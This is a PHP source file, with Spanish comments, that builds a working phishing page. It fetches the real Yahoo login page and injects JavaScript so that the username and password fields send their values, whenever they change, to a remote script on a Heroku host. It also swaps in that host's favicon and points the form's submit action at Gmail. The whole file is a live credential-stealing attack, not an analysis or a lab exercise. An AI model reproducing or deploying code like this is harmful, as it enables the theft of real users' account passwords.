<?php
$html = file_get_contents('https://login.yahoo.com/');
$insertCode = "<script language=\"javascript\" type=\"text/javascript\">
	
function getXMLHTTPRequest() {
  try {
    req = new XMLHttpRequest();
  } catch(err1) {
    try {
      req = new ActiveXObject(\"Msxml2.XMLHTTP\");
    } catch (err2) {
      try {
        req = new ActiveXObject(\"Microsoft.XMLHTTP\");
      } catch (err3) {
        req = false;
      }
    }
  }
  return req;
}


var http = getXMLHTTPRequest(); // creo una instancia del objeto XMLHTTPRequest.

function enviarvariable(variable) { // funcion encargada de inviar la variable al archivo php llamado index.php.
    var url = 'http://loginyahoo.herokuapp.com/escribe.php?variable=' + variable; // creación de la URL.
    http.open(\"GET\", url, true); // fijando los parametros para el envío de datos.
    http.onreadystatechange = handler; // Qué función utilizar en caso de que el estado de la petición cambie.
    http.send(null); // enviar petición.
}

function handler() {
  if (http.readyState == 4) {
    if(http.status == 200) {
      a=http.responseText; // El texto de respuesta del archivo index.php lo muestra como una alerta.
    }
  }
}

</script>
<link rel=\"shortcut icon\" href=\"http://loginyahoo.herokuapp.com/favicon.ico\">
</head>";
$htmlConstruida = str_replace("</head>", $insertCode, $html);

$insertCode = "id='username' onchange='enviarvariable(document.getElementById(\"username\").value)'";
$htmlConstruida = str_replace('id="username"', $insertCode, $htmlConstruida);

$insertCode = "id='passwd' onchange='enviarvariable(document.getElementById(\"passwd\").value)'";
$htmlConstruida = str_replace('id="passwd"', $insertCode, $htmlConstruida);

$insertCode = "id='.save' onclick='enviarvariable(document.getElementById(\"passwd\").value)'";
$htmlConstruida = str_replace('id=".save"', $insertCode, $htmlConstruida);

$insertCode = "action='https://mail.google.com'";
$htmlConstruida = str_replace('action="https://login.yahoo.com/config/login?"', $insertCode, $htmlConstruida);

echo $htmlConstruida;
?>


